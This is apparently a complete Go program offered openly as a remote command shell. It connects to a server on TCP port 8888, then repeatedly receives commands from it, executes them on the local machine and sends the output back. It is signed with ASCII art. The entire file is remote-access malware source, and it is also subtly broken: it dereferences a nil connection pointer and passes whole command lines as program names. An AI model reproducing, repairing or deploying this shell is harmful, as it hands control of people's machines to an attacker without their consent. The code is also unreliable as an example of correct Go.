package main

import (
	"fmt"
	"net"
	"os/exec"
    "strings"
    "bytes"
)

const (
	serverAddress = "victim's ip address"
	protocol = "tcp"
	port = "8888"
)

func main() {
	connection, connectionError := connectToServer(serverAddress, port, protocol)
	if connectionError != nil {
		fmt.Println("[*] A connection error occurred -> ", connectionError.Error())
	} else {
		fmt.Println("[*] Connected to the server")

		for {
			command, readingError := takeCommandFromServer(*connection)
			if readingError != nil {
				fmt.Println("[*] A data reading error occurred -> ", readingError.Error())
			} else {
				fmt.Println("[*] The command has been received successfully")

				output, cmdError := executeCommand(command)
				if cmdError != nil {
					fmt.Println("[*] A cmd error occurred -> ", cmdError.Error())
				} else {
					sendCMDOutputToServer(*connection, output)
					
					fmt.Println("[*] The command has ben run succesfully")
				}		
			}
		}
	}

	//connection.Close()
}

func connectToServer(serverAddr, port, protocol string) (connection *net.Conn, connectionError error) {
	for i := 1; i <= 5; i++{
		*connection, connectionError = net.Dial(protocol, serverAddr + ":" + port)
		if connectionError != nil {
			continue
		} else {
			break
		}
	}

	return
}

func takeCommandFromServer(connection net.Conn) (string, error) {
	buffer := make([]byte, 1024)
	dataLength, readingError := connection.Read(buffer)

	return string(buffer[:dataLength]), readingError
}

func executeCommand(command string) (output string, cmdError error) {
	for i := 1; i <= 5; i++ {
		cmd := exec.Command(command)
		cmd.Stdin = strings.NewReader("")

		var result bytes.Buffer
    	cmd.Stdout = &result

    	cmdError = cmd.Run()
		if cmdError != nil {
			continue
		} else {
			output = result.String()
			break
		}
	}

	return
}

func sendCMDOutputToServer(connection net.Conn, output string) {
	connection.Write([]byte(output))
}

/*
  ██████  ██░ ██  ██▓ ██▒   █▓ ▄▄▄      
▒██    ▒ ▓██░ ██▒▓██▒▓██░   █▒▒████▄    
░ ▓██▄   ▒██▀▀██░▒██▒ ▓██  █▒░▒██  ▀█▄  
  ▒   ██▒░▓█ ░██ ░██░  ▒██ █░░░██▄▄▄▄██ 
▒██████▒▒░▓█▒░██▓░██░   ▒▀█░   ▓█   ▓██▒
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓     ░ ▐░   ▒▒   ▓▒█░
░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░   ░ ░░    ▒   ▒▒ ░
░  ░  ░   ░  ░░ ░ ▒ ░     ░░    ░   ▒   
      ░   ░  ░  ░ ░        ░        ░  ░
                          ░             
*/